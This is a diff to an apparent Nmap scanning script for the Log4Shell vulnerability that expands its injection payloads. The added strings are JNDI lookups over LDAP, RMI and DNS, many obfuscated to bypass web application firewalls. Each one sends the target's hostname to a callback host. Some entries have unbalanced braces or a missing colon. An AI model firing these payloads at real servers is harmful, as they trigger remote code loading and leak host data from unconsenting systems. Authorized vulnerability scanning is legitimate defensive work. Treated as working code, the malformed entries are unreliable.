@@ -134,29 +134,46 @@ local HTTP_METHODS = { 'GET', 'HEAD', 'POST', 'OPTIONS' }
 local HTTP_HEADERS = {'X-Api-Version', 'User-Agent', 'Cookie', 'Referer', 'Accept-Language', 'Accept-Encoding', 'Upgrade-Insecure-Requests', 'Accept', 'upgrade-insecure-requests', 'Origin', 'Pragma', 'X-Requested-With', 'X-CSRF-Token', 'Dnt', 'Content-Length', 'Access-Control-Request-Method', 'Access-Control-Request-Headers', 'Warning', 'Authorization', 'TE', 'Accept-Charset', 'Accept-Datetime', 'Date', 'Expect', 'Forwarded', 'From', 'Max-Forwards', 'Proxy-Authorization', 'Range,', 'Content-Disposition', 'Content-Encoding', 'X-Amz-Target', 'X-Amz-Date', 'Content-Type', 'Username', 'IP', 'IPaddress', 'Hostname'}
 
 -- Default payload
-local DEFAULT_PAYLOAD = '${jndi:ldap://%s}'
+local DEFAULT_PAYLOAD = '${jndi:ldap://x${hostName}%s}'
 
 -- WAF (Web Application Firewall) bypass payloads
 local WAF_BYPASS_PAYLOADS = {
   -- RMI
-  '${jndi:rmi://%s}',
-  '${${lower:jndi}:${lower:rmi}://%s}',
-  '${jndi:${lower:r}${lower:m}${lower:i}',
-  '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%s}',
+  '${jndi:rmi://x${hostName}%s}',
+  '${${lower:jndi}:${lower:rmi}://x${hostName}%s}',
+  '${${jndi:${lower:r}${lower:m}${lower:i}://x${hostName}%s}',
+  '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://x${hostName}%s}',
 
   -- DNS
-  '${jndi:dns://%s}',
-  '${${lower:jndi}:${lower:dns}://%s}',
-  '${jndi:${lower:d}${lower:n}${lower:s}',
-  '${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://%s}',
+  '${jndi:dns://x${hostName}%s}',
+  '${${lower:jndi}:${lower:dns}://x${hostName}%s}',
+  '${${jndi:${lower:d}${lower:n}${lower:s}://x${hostName}%s}',
+  '${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://x${hostName}%s}',
 
   -- LDAP
-  '${jndi:ldap://%s}',
-  '${${lower:jndi}:${lower:ldap}://%s}',
-  '${jndi:${lower:l}${lower:d}a${lower:p}',
-  '${jndi:${lower:l}${lower:d}${lower:d}${lower:p}',
-  '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}a${::-p}://%s}',
-  '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s}',
+  '${jndi:ldap://x${hostName}%s}',
+  '${${lower:jndi}:${lower:ldap}://x${hostName}%s}',
+  '${${jndi:${lower:l}${lower:d}a${lower:p}://x${hostName}%s}',
+  '${${jndi:${lower:l}${lower:d}${lower:d}${lower:p}://x${hostName}%s}',
+  '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}a${::-p}://x${hostName}%s}',
+  '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://x${hostName}%s}',
+
+  -- OTHER METHODS
+  '${j${k8s:k5:-ND}i${sd:k5:-:}ldap://x${hostName}%s}',
+--  '${jnd${123%25ff:-${123%25ff:-i:}}ldap://%s',
+  '${lower:${🅰️d:-${lower:}}jndi:}ldap://x${hostName}%s',
+  '${j${upper:${lower:n}}di:ldap://x${hostName}%s}',
+  '${${date:"j"}${date:"n"}${date:"d"}${date:"i"}:ldap://x${hostName}%s}',
+  '${${env:BARFOO:-j}Ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//x${hostName}%s}',
+  '${j${main:k5:-Nd}i${spring:k5:-:}ldap://x${hostName}%s}',
+  '${j${sys:k5:-nD}${lower:i${web:k5:-:}}ldap://x${hostName}%s}',
+  '${j${::-nD}i${::-:}ldap://x${hostName}%s}',
+  '${j${EnV:K5:-nD}i:ldap://x${hostName}%s}',
+  '${j${loWer:Nd}i${uPper::}ldap://x${hostName}%s}',
+  '${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:l}dap${env:NaN:-:}://x${hostName}%s}',
+  '${${"£$_"£🅰️d:-${lower:j}n}di:ldap://x${hostName}%s}',
+  '${${🅰️d:-${lower:}j}ndi:ldap//x${hostName}%s}'
+
 }
 
 --- Copied from tableaux library for older Nmap releases
@@ -312,3 +329,5 @@ action = function(host, port)
   end
 
 end
+
+
